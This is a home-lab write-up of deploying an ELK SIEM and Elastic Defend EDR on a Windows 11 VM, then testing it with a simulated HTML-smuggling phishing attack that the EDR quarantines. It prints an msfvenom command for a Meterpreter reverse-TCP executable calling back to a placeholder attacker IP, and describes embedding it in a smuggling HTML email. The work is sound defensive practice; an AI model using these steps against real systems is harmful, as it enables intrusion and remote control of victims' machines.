# ELK Stack & Elastic Defender EDR

## Overview
This project documents the implementation of a detection engineering home lab centered around a central ELK Stack SIEM and a Windows 11 endpoint monitored by the Elastic Defend agent. The objective was to emulate a real-world phishing attack using HTML smuggling to bypass network perimeters, deliver a stageless reverse TCP payload, and validate the endpoint's automated defensive and incident response capabilities.

## Lab Goals
- Deploy a comprehensive SIEM solution for endpoints on my homelab network.
- Be able to methodically plan and execute an attack scenario. (HTML Smuggling)
- Utilize endpoint and attack data inside of Elasticsearch to create custom query rules to report or block actions from occuring.

## Lab Architecture & Initialization

    SIEM / Analytics: ELK Stack deployed via Docker to ingest endpoint telemetry and manage alerts.

    Target Endpoint: Windows 11 Enterprise VM executing simulated adversary behaviors.

    Endpoint Security: Elastic Agent running Elastic Defend (EDR) in prevention mode.

    Attacker Infrastructure: Kali Linux box used to craft the malicious payload.

SIEM Deployment:
The core ELK infrastructure was spun up via a standardized containerized deployment:
Bash

## Initializing the ELK SIEM environment
Download the .env file and docker-compose.yml file from [here](https://github.com/elastic/elasticsearch/tree/main/docs/reference/setup/install/docker) and edit all settings needed for my environment.

run the build command while inside the directory that houses both files:

sudo docker-compose up -d

<img width="800" alt="image" src="https://github.com/user-attachments/assets/5939d4a3-05d5-4bce-95a3-a907c02d5437" />


EDR Deployment:
The Windows 11 endpoint was instrumented by deploying the Elastic Agent and enrolling it into the Fleet server with the Elastic Defend integration applied,
via PowerShell.

## Installing and enrolling the Elastic Agent on the Windows 11 endpoint
.\elastic-agent.exe install --url=https://<Fleet_Server_IP>:8220 --enrollment-token=<Enrollment_Token> --insecure

<img width="800" alt="Elastic Defender Windows Install" src="https://github.com/user-attachments/assets/8de58469-1dc6-4f63-8aab-1a00fd159de0" />


### Phase 1: Payload Crafting & Phishing Delivery

To bypass standard network-layer controls, an HTML smuggling vector was utilized to deliver a weaponized executable.

### 1. Generating the Payload:
A stageless Windows x64 Meterpreter reverse TCP payload was generated using msfvenom.
Bash

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o smuggled_payload.exe

### 2. Assembling the Smuggling Document:
The binary was converted into a Base64 string and embedded inside a client-side JavaScript block within T1027_006_smuggling.html

base64 -w 0 payload.exe > base64_exe.txt

<img width="800" alt="HTML_Smuggling_Malware" src="https://github.com/user-attachments/assets/4c83c29f-7210-4f76-8d61-80531c2ae52a" />


### 3. Delivery Mechanism:
The weaponized HTML file was emailed directly to the target endpoint to simulate a realistic phishing campaign.

#### Phase 2: Execution & Network Evasion

The attack relied on the endpoint's browser to build the malware locally, rendering network firewalls and email gateways blind since the file was never transferred as a compiled executable.

[ Email Inbox ] ---> ( Encoded HTML Attachment ) ---> [ Perimeter/Email Gateway ] (Allowed: Read as benign text)
                                                              |
                                                              v
[ Windows 11 Browser Memory ] <--- ( JavaScript Blob Assembly ) <-- [ Dropped payload.exe ]

When the user opened the phishing attachment, the embedded script utilized a JavaScript Blob array to reassemble the Meterpreter binary directly inside browser memory before forcing a localized disk write.

<img width="800" alt="Phishing_Email" src="https://github.com/user-attachments/assets/7d7fa7c7-a45d-495d-be09-500a080dd721" />


### Phase 3: EDR Detection & Incident Response

The moment the browser completed the memory compilation and dropped the file to disk, the endpoint controls intervened, moving the workflow from detection to active incident response using Automated Prevention.

Elastic Defend’s behavioral and static analysis engines identified the Meterpreter payload immediately upon the disk write event, automatically quarantining the executable before it could execute or establish the reverse shell connection back to the Kali listener.

<img width="800" alt="EDR_Blocks_Payload" src="https://github.com/user-attachments/assets/8a3aaa1f-8ace-42b9-b580-47dd8f9b5cb7" />


## Case Management & Triage

Within the Kibana Security application, multiple telemetry triggers fired simultaneously. To organize the incident response effort, four distinct EDR malware alerts were aggregated and escalated into a single unified Case. This demonstrates the ability to track an incident from initial triage through to remediation tracking.

<img width="800" alt="ELK_Stack_Case_Creation" src="https://github.com/user-attachments/assets/694e076a-65c2-4c4d-9260-0f2aac97c73e" />


Execution Pipeline Analysis (Attack Map)

To perform root cause analysis, I utilized Elastic's Analyzer / Process Tree (Attack Map) view. This visual timeline perfectly mapped the execution pipeline, explicitly showing:

- The parent browser process (msedge.exe).

- The file modification event writing the anomalous executable to the file system.

- The Elastic Defend engine intercepting the execution chain and terminating the threat.

<img width="800" alt="Attack_Map" src="https://github.com/user-attachments/assets/a3371c71-59bc-434d-b4c1-3db078cd9dc4" />

<img width="800" alt="image" src="https://github.com/user-attachments/assets/00de8b17-c72c-4aef-9479-48794518368c" />

<img width="800" alt="image" src="https://github.com/user-attachments/assets/ad93d4d6-3123-4a4b-9049-1d2e6d980d2e" />



## Key Takeaways

- Network Blindness: Network signatures and standard email gateways are highly ineffective against application-layer obfuscation like HTML smuggling. Initial access validation must happen at the endpoint layer.

- The Value of EDR: Automated prevention controls are critical. Coupling a SIEM with an active EDR ensures that stageless payloads bypassing the perimeter are neutralized at the disk level, significantly reducing the Mean Time to Respond (MTTR).

- Streamlined Incident Response: Leveraging SIEM Case Management and visual Process Analyzers allows detection engineers and analysts to rapidly track a threat's origin (the browser) rather than just reacting to the isolated file drop.




